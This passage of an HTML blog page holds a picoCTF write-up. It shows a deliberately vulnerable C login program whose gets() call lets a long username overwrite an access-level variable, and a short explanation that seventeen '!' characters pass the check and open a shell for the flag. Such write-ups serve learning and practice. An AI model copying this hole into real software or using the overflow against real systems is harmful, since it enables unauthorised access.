+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">accessLevel</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span>
+<span class="w">        </span><span class="s">&quot;+----------------------------------------+</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|                                        |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|                                        |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|                                        |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|                                        |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|  Welcome to the VR gear admin console  |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|                                        |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|                                        |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|                                        |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|                                        |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;+----------------------------------------+</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|                                        |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|      Your account is not recognized    |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;|                                        |</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;+----------------------------------------+</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;</span><span class="se">\n\n\n\n</span><span class="s">&quot;</span>
+<span class="w">        </span><span class="s">&quot;Please login to continue...</span><span class="se">\n\n\n</span><span class="s">&quot;</span>
+<span class="w">    </span><span class="p">);</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">login</span><span class="p">();</span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Your access level is: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">access</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">access</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mh">0xff</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Login unsuccessful.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">access</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x30</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Admin access granted!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;The flag is in </span><span class="se">\&quot;</span><span class="s">flag.txt</span><span class="se">\&quot;</span><span class="s">.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Login successful.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;You do not have permission to access this resource.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>This is the last binary exploitation challenge at level 2 of picoCTF. Program asks us for username and password, checks if our access level is bellow <code>0x30</code> and if so prints the flag.</p>
+<p>Looking at the login function we see that <code>username</code> buffer is declared just after <code>accessLevel</code> and that program uses <code>gets</code> function which doesn’t check for the length of the input. This means that if we input more then 16 bytes as username we are going to overflow <code>accessLevel</code>. Since we know that <code>!</code> is <code>0x21</code> in hex we can use <code>17 * !</code> to overflow <code>accessLevel</code>, pass the check and get the flag.</p>
+<p><img alt="vgear console output" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_7_29_vgear.png"></p>
+                </div>
+                <footer class="text-right">
+                    <p>- F3real</p>
+                </footer>
+    <div id="show-comments" class="span7 text-center">
+        <a href="https://f3real.github.io/picoCTF_lvl2Remaining.html#disqus_thread"
+          data-disqus-identifier="picoCTF_lvl2Remaining"
+        class="btn btn-primary twitchy-background">Show Comments</a>
+    </div>
+    <section id="comments" class="comments hidden">
+        <hr/>
+        <h2>Comments</h2>
+        <div id="disqus_thread"></div>
+        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
+            Disqus.</a></noscript>
+        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </section>
+            </div>
+        </div>
+    </article>
+</section>
+<footer>
+    <hr>
+    <div class="row">
+        <div class="col-lg-10 text-center">
+            <p><small>
+                Built by <a href="http://docs.getpelican.com/en/latest">Pelican</a> / <a href="https://github.com/F3real/pelican-twitchy">pelican-twitchy</a>
+                &middot;                    &copy; 2024 F3real
+            </small></p>
+        </div>
+    </div>
+</footer>            </div>
+        </div>
+        <!-- /#page-content-wrapper -->
+    </div>
+    <!-- /#wrapper -->
+
+<!-- disqus -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'https-f3real-github-io'; // required: replace example with your forum shortname
+
+            var disqus_identifier = 'picoCTF_lvl2Remaining';
+        var disqus_url = 'https://f3real.github.io/picoCTF_lvl2Remaining.html';
+
+    var disqus_config = function () {
+        this.language = "en";
+    };
+
+        var commentsDiv = document.getElementById('show-comments');
+        commentsDiv.onclick = function() {
+            /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function () {
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+            this.style.display = 'none';        
+        };
+</script>
+<!-- /disqus -->
+    <script>
+        const wrapper = document.getElementById('wrapper');
+        const sidebarBig = document.getElementById('sidebar-wrapper');
+        const sidebarSmall = document.getElementById('sidebar-wrapper-small');
+
+        const triggers = Array.from(document.querySelectorAll('[data-toggle="collapse"]'));
+        for (var i = 0; i < triggers.length; i++) { 
+            triggers[i].addEventListener('click', (ev) => {
+                const elm = ev.currentTarget;    
+                ev.preventDefault();
+                const selector = elm.getAttribute('href').replace('#','');
+                elm.classList.toggle('collapsed');
+                document.getElementById(selector).classList.toggle('show');
+            }, false);
+        } 
+
+        function showBigNav() {;
+            sidebarBig.style.display = 'block';
+            sidebarSmall.style.display = 'none';
+        }
+        function showSmallNav() {
+            sidebarBig.style.display = 'none';
+            sidebarSmall.style.display = 'block';
+        }
+
+        const mediaQuery = window.matchMedia('(min-width:768px)');
+        mediaQuery.onchange = e => {
+            if (wrapper.classList.contains('toggled')) {
+                    wrapper.classList.remove('toggled');
+            } else {
+                if (e.matches) {
+                    showBigNav();
+                } else {
+                    showSmallNav();
+                }
+            }
+        }
+
+        function setNavbar() {
+            var condition = wrapper.classList.contains('toggled');
+            if (!mediaQuery.matches) {
+                condition = !condition;
+            }
+            if (condition) {
+                showSmallNav();
+            } else {
+                showBigNav();
+            }
+        }
+
+        function toggleMenu(){
+            wrapper.classList.toggle('toggled');
+            setNavbar();
+        }
+
+        window.onload = setNavbar;
+    </script>
+	<script data-goatcounter="https://f3real.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+</body>
+</html>
